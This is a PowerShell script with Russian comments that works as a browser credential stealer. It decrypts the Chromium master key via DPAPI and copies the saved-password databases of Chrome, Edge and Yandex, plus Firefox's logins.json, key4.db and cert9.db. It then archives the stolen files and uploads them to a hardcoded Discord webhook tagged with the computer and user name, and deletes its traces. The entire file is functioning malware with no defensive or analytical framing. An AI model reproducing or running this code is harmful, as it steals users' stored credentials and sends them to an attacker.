# [ Конфигурация Discord ]
$hookUrl = "https://discordapp.com/api/webhooks/1500921789273083906/Lo-Y6cSsllkNinCRaaCVj9Kttd27D_D8jLAC2cwZVvHvMQ5b87GqfM8oNrEtwxxTIyKt"

# [ Инициализация ]
$tempDir = "$env:TEMP\sys_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
$logPath = "$tempDir\report.log"

# Подгружаем системную сборку для дешифровки
Add-Type -AssemblyName System.Security

# Функция для дешифровки ключа Chromium-браузеров
function Get-Key($statePath, $label) {
    if (Test-Path $statePath) {
        try {
            $json = Get-Content $statePath -Raw | ConvertFrom-Json
            $rawKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
            $encKey = $rawKey[5..($rawKey.Length-1)]
            
            # Дешифровка мастер-ключа через системный DPAPI
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            
            $logLine = "[$($label)] Master Key: $([Convert]::ToBase64String($masterKey))"
            Out-File -FilePath $logPath -InputObject $logLine -Append -Encoding UTF8
            return $true
        } catch { return $false }
    }
    return $false
}

# 1. СБОР ДАННЫХ CHROMIUM (Chrome, Edge, Yandex)
$browsers = @(
    @{name="Chrome"; path="Google\Chrome\User Data"},
    @{name="Edge"; path="Microsoft\Edge\User Data"},
    @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $userDataPath = Join-Path $env:LOCALAPPDATA $b.path
    if (Test-Path $userDataPath) {
        $foundFiles = Get-ChildItem -Path $userDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        foreach ($file in $foundFiles) {
            $label = "$($b.name)_$($file.Directory.Name)"
            $localState = Join-Path $userDataPath "Local State"
            if (Get-Key $localState $label) {
                Copy-Item $file.FullName -Destination "$tempDir\$($label)_db" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# 2. СБОР ДАННЫХ FIREFOX (logins + key4 + cert9)
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    $ffProfiles = Get-ChildItem -Path $ffPath -Directory -ErrorAction SilentlyContinue
    foreach ($profile in $ffProfiles) {
        $label = "FF_$($profile.Name)"
        $files = @("logins.json", "key4.db", "cert9.db")
        foreach ($f in $files) {
            $src = Join-Path $profile.FullName $f
            if (Test-Path $src) {
                Copy-Item $src -Destination "$tempDir\$($label)_$f" -Force -ErrorAction SilentlyContinue
            }
        }
        Out-File -FilePath $logPath -InputObject "[$($label)] Profile collected." -Append -Encoding UTF8
    }
}

# 3. УПАКОВКА И ОТПРАВКА В DISCORD
if ((Get-ChildItem $tempDir).Count -gt 1) {
    $zipPath = "$env:TEMP\report_$(Get-Random).zip"
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force

    try {
        $client = New-Object System.Net.Http.HttpClient
        $content = New-Object System.Net.Http.MultipartFormDataContent
        
        # Подготовка файла для отправки
        $fileStream = [System.IO.File]::OpenRead($zipPath)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $content.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipPath))
        
        # Текстовая подпись
        $content.Add((New-Object System.Net.Http.StringContent("Protocol 81: $env:COMPUTERNAME ($env:USERNAME)")), "content")

        # Отправка POST запроса
        $response = $client.PostAsync($hookUrl, $content).Result
        
        # Закрытие ресурсов
        $fileStream.Close()
        $fileStream.Dispose()
        $content.Dispose()
        $client.Dispose()
    } catch {}

    # Заметаем следы: удаляем архив
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
}

# Удаляем временную папку со всеми собранными данными
Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
